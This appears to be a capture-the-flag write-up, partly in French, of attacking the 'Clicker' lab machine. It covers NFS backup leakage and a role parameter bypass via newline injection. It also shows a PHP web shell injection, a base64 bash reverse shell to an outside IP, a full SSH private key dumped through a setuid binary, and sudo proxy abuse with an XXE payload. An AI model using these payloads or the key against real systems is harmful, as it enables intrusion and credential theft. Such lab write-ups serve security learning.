# enum
```bash
nmap -Pn -sVC -T4 clicker.htb
```   
	PORT     STATE SERVICE VERSION
	22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey: 
	|   256 89:d7:39:34:58:a0:ea:a1:db:c1:3d:14:ec:5d:5a:92 (ECDSA)
	|_  256 b4:da:8d:af:65:9c:bb:f0:71:d5:13:50:ed:d8:11:30 (ED25519)
	80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
	|_http-title: Clicker - The Game
	| http-cookie-flags: 
	|   /: 
	|     PHPSESSID: 
	|_      httponly flag not set
	|_http-server-header: Apache/2.4.52 (Ubuntu)
	111/tcp  open  rpcbind 2-4 (RPC #100000)
	| rpcinfo: 
	|   program version    port/proto  service
	|   100000  2,3,4        111/tcp   rpcbind
	|   100000  2,3,4        111/udp   rpcbind
	|   100000  3,4          111/tcp6  rpcbind
	|   100000  3,4          111/udp6  rpcbind
	|   100003  3,4         2049/tcp   nfs
	|   100003  3,4         2049/tcp6  nfs
	|   100005  1,2,3      46290/udp   mountd
	|   100005  1,2,3      47431/tcp   mountd
	|   100005  1,2,3      53301/udp6  mountd
	|   100005  1,2,3      57413/tcp6  mountd
	|   100021  1,3,4      41757/tcp   nlockmgr
	|   100021  1,3,4      42071/tcp6  nlockmgr
	|   100021  1,3,4      43165/udp   nlockmgr
	|   100021  1,3,4      52504/udp6  nlockmgr
	|   100024  1          37152/udp   status
	|   100024  1          40731/tcp   status
	|   100024  1          49576/udp6  status
	|   100024  1          57089/tcp6  status
	|   100227  3           2049/tcp   nfs_acl
	|_  100227  3           2049/tcp6  nfs_acl

## nfs
```bash
showmount -e clicker.htb 
```
	Export list for clicker.htb:
	/mnt/backups *

```bash
mkdir mnt
sudo mount -t nfs -o vers=4 clicker.htb:/mnt/backups  ./mnt
unzip mnt/clicker.htb_backup.zip
```

# foothold
## code analyse
 cat clicker.htb/db_unit.php
	$db_server="localhost";
	$db_username="clicker_db_user";
	$db_password="clicker_db_password";
	$db_name="clicker";

 cat clicker.htb/save_game.php
	<?php
	session_start();
	include_once("db_utils.php");
	
	if (isset($_SESSION['PLAYER']) && $_SESSION['PLAYER'] != "") {
	        $args = [];
	        foreach($_GET as $key=>$value) {
	                if (strtolower($key) === 'role') {?>
il y a un filtre sur les parametres . il refuse tout ce qui est role
```
cat clicker.htb/admin.php
```
	<?php
	session_start();
	include_once("db_utils.php");
	
	if ($_SESSION["ROLE"] != "Admin") {
	  header('Location: /index.php');?>

Je peux donc ajouter un parametre *role* avec la valeur *Admin*
```bash
curl -i -s -k -X $'GET' \
    -H $'Host: clicker.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: close' -H $'Referer: http://clicker.htb/play.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=j661pj4q6n6f7166cfra9104s4' \
    $'http://clicker.htb/save_game.php?clicks=50&role%0A=Admin&level=2'
```

## revershell
```
rlwrap nc -lnvp 1234
```
```
echo -n 'bash -i >& /dev/tcp/10.10.16.108/1234 0>&1' | base64 -w 0
```
```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMDgvMTIzNCAwPiYx
```

```
<?php system("echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMDgvMTIzNCAwPiYx | base64 -d | bash");?>
```
```
%3C?php%20system(%22echo%20YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMDgvMTIzNCAwPiYx%20%7C%20base64%20-d%20%7C%20bash%22);?%3E
```

```
curl -i -s -k -X $'GET' \
    -H $'Host: clicker.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: close' -H $'Referer: http://clicker.htb/play.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=j661pj4q6n6f7166cfra9104s4' \
    $'http://clicker.htb/save_game.php?nickname=%3c%3fphp%20system(%22echo%20YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi4xMDgvMTIzNCAwPiYx%20%7c%20base64%20-d%20%7c%20bash%22)%3b%3f%3e&clicks=9999999999&role%0A=Admin&level=80' -v
```

```
curl -i -s -k -X $'POST' \
    -H $'Host: clicker.htb' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 31' -H $'Origin: http://clicker.htb' -H $'Connection: close' -H $'Referer: http://clicker.htb/admin.php' -H $'Upgrade-Insecure-Requests: 1' \
    -b $'PHPSESSID=j661pj4q6n6f7166cfra9104s4' \
    --data-binary $'threshold=1000000&extension=php' \
    $'http://clicker.htb/export.php' -v
```


# Lateral movement
username = jack

```
find / -user jack -exec ls -ld {} \; 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```
	drwxr-x--- 7 jack jack 4096 Sep  6 12:30 /home/jack
	drwxr-xr-x 2 jack jack 4096 Jul 21  2023 /opt/manage
	-rw-rw-r-- 1 jack jack 256 Jul 21  2023 /opt/manage/README.txt
	-rwsrwsr-x 1 jack jack 16368 Feb 26  2023 /opt/manage/execute_query

J'analyse */opt/manage/execute_query* dans ghidra et GPT
$
```
strings execute_query
strace ./execute_query 4
````

je récupère la clé ssh de jack
$
```bash
/opt/manage/execute_query 5 ../.ssh/id_rsa
```
	-----BEGIN OPENSSH PRIVATE KEY-----
	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
	-----END OPENSSH PRIVATE KEY-----

## PrivEsc
$
```bash
sudo -l
```
	Matching Defaults entries for jack on clicker:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
	
	User jack may run the following commands on clicker:
	    (ALL : ALL) ALL
	    (root) SETENV: NOPASSWD: /opt/monitor.sh

`SETENV:`: Autorise l'utilisateur à utiliser l'option `-E` ou `--preserve-env` avec sudo, ce qui permet de préserver l'environnement de l'utilisateur lors de l'exécution de la commande.
$	    
```bash
ll /opt/monitor.sh
```
	-rwxr-xr-x 1 root root 504 Jul 20  2023 /opt/monitor.sh

$ Proxy_chain  #ExploitSETENV
```
export http_proxy=http://10.10.16.108:1234
sudo -E /opt/monitor.sh
```

intercept request and modify response in burpsuit 
```
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY xxe SYSTEM "/etc/passwd">
]>
<foo>&xxe;</foo>
```
